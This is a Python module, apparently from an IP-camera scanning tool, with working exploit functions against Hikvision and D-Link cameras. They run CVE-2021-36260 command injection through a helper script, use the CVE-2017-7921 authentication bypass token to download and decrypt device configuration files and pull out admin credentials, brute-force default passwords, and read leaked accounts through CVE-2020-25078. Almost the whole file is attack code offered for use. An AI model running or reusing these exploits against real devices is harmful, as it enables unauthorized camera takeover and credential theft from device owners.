"""Vulnerability Exploition"""
import os
import sys
import requests

CWD = os.path.dirname(__file__)
sys.path.append(os.path.join(CWD, '..'))
from utils.net import get_user_agent


def cve_2021_36260(ip: str) -> list:
    """海康威视任意命令执行漏洞"""
    cve_lib = os.path.join(CWD, 'lib/CVE-2021-36260.py')
    res = os.popen(f"python3 {cve_lib} --rhost {ip} --rport 80 --cmd 'pwd'").readlines()[-2].strip()
    return [res == '/home', 'cve-2021-36260']


def cve_2017_7921(ip: str) -> list:
    """海康威视绕过认证漏洞"""
    headers = {'User-Agent': get_user_agent()}
    user_url = f"http://{ip}/Security/users?auth=YWRtaW46MTEK"
    config_url = f"http://{ip}/System/configurationFile?auth=YWRtaW46MTEK"

    r = requests.get(user_url, timeout=3, verify=False, headers=headers)
    if r.status_code == 200 and 'userName' in r.text and 'priority' in r.text and 'userLevel' in r.text:
        rc = requests.get(config_url, timeout=8, verify=False, headers=headers)
        with open(f"{ip}-config", 'wb') as f:
            f.write(rc.content)
        info = eval(os.popen(f"python3 scan/lib/decrypt_configure.py {ip}-config").readline().strip())
        idx = - info[::-1].index('admin')
        info = info[idx - 1: ]
        os.remove(f"{ip}-config")
        return [True, 'cve-2017-7921', str(info)]
    return [False, 'cve-2017-7921']


def hik_weak(ip, users=['admin'], passwords=['12345']) -> list:
    """海康威视弱口令扫描 & 也可以指定用户名密码扫描"""
    headers = {'User-Agent': get_user_agent()}
    for user in users:
        for p in passwords:
            r = requests.get(f"http://{ip}/PSIA/System/deviceinfo", auth=(user, p), timeout=3, verify=False, headers=headers)
            if 'IP CAMERA' in r.text or 'IPCamera' in r.text:
                return [True, 'hikvision weak pass', f"{user}:{p}"]
    return [False, 'hikvision weak pass']


def cve_2020_25078(ip: str) -> list:
    """DLink摄像头账号密码暴露漏洞"""
    headers = {'User-Agent': get_user_agent()}
    r = requests.get(f"http://{ip}/config/getuser?index=0", timeout=3, verify=False, headers=headers)
    if r.status_code == 200 and "name" in r.text and "pass" in r.text and "priv" in r.text and 'html' not in r.text:
        return [True, 'cve-2020-25078', ','.join(r.text.split())]
    return [False, 'cve-2020-25078']


if __name__ == '__main__':
    print(cve_2021_36260('10.101.35.74'))